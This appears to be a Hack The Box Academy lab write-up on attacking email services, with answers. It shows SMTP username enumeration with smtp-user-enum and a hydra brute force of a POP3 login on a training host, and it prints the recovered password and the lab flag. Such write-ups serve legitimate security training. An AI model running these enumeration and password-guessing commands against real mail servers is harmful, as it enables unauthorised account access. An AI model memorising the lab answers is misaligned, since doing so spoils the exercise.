# Section 15: Attacking Email Services

Module: 11. Attacking Common Services

---

## Questions & Answers

### 1. What is the available username for the domain inlanefreight.htb in the SMTP server?

Context:
```bash
┌─[eu-academy-2]─[10.10.14.184]─[htb-ac-2162140@htb-6kdstm3uyc]─[~/subbrute]
└──╼ [★]$ smtp-user-enum -M RCPT -U resource-users.list -D inlanefreight.htb -t 10.129.203.12
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... RCPT
Worker Processes ......... 5
Usernames file ........... resource-users.list
Target count ............. 1
Username count ........... 80
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ inlanefreight.htb

######## Scan started at Sat Aug  8 10:34:27 2026 #########
10.129.203.12: marlin@inlanefreight.htb exists
######## Scan completed at Sat Aug  8 10:34:42 2026 #########
1 results.
```

**Answer:** `marlin`

---

### 2. Access the email account using the user credentials that you discovered and submit the flag in the email as your answer.

Context:
```bash
┌──(kali㉿kali)-[~/Desktop/HTB/Academy]
└─$ hydra -l "marlin@inlanefreight.htb" -P resource-passwords.list -f inlanefreight.htb pop3
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-20 17:56:25
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 250 login tries (l:1/p:250), ~16 tries per task
[DATA] attacking pop3://inlanefreight.htb:110/
[110][pop3] host: inlanefreight.htb   login: marlin@inlanefreight.htb   password: poohbear
[STATUS] attack finished for inlanefreight.htb (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-20 17:56:28
```

**Answer:** `HTB{w34k_p4$$w0rd}`

---


[Back to Module Index](./README.md)
